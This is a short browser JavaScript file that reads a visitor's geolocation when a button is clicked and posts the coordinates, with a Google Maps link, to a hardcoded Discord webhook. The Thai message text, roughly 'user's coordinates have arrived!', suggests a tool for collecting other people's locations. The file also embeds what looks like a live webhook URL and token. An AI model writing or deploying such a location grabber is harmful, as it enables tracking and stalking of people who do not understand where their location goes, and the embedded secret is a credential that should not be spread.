document.getElementById('locateBtn').addEventListener('click', () => {
  const output = document.getElementById('output');

  if (!navigator.geolocation) {
    output.textContent = 'Geolocation not supported by your browser.';
    return;
  }

  output.textContent = 'Locating...';

  navigator.geolocation.getCurrentPosition(success, error);

  function success(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    output.innerHTML = `
      <strong>Latitude:</strong> ${latitude}<br>
      <strong>Longitude:</strong> ${longitude}<br>
      <em>Data sent to Discord...</em>
    `;

    sendToDiscord(latitude, longitude);
  }

  function error() {
    output.textContent = 'ไม่สามารถเข้าถึงพิกัดได้ 😥';
  }
});

function sendToDiscord(lat, lng) {
  const webhookURL = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
  const content = {
    content: `📍 พิกัดผู้ใช้มาแล้วจ้าา!\n🌐 Lat: ${lat}\n🌐 Lng: ${lng}\n🗺️ https://maps.google.com/?q=${lat},${lng}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(content)
  })
  .then(() => {
    console.log("✅ ส่งเข้า Discord เรียบร้อยแล้ว!");
  })
  .catch((err) => {
    console.error("❌ Error ส่งเข้า Discord:", err);
  });
}
